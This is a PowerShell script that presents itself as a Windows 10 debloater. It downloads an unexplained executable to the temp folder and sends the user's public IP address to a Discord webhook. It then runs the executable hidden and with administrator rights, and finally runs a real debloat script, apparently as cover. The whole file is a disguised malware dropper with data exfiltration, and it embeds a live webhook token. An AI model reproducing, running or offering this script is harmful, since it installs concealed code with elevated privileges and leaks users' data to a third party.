iwr "https://raw.githubusercontent.com/Dazd-Pkz/Windows10Debloater/main/saucisson.exe" -o $env:TEMP\saucisson.exe

$hookUrl = 'https://discord.com/api/webhooks/1007602451702087793/iOOKR4A2rDTjBNiy5QlsHj7EInFqpiQTvbCHVxrh9KtaOKW9VSxrY0xbb951XAWoQSbQ'
$MyIP = (Invoke-WebRequest -uri "http://ifconfig.me/ip").Content

$payload = [PSCustomObject]@{
    content = (Invoke-WebRequest -useb -uri "http://ifconfig.me/ip").Content
}
Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json)

Start-Process -Verb RunAs -WindowStyle hidden -FilePath $env:TEMP\saucisson.exe
iwr -useb git.io/debloat|iex
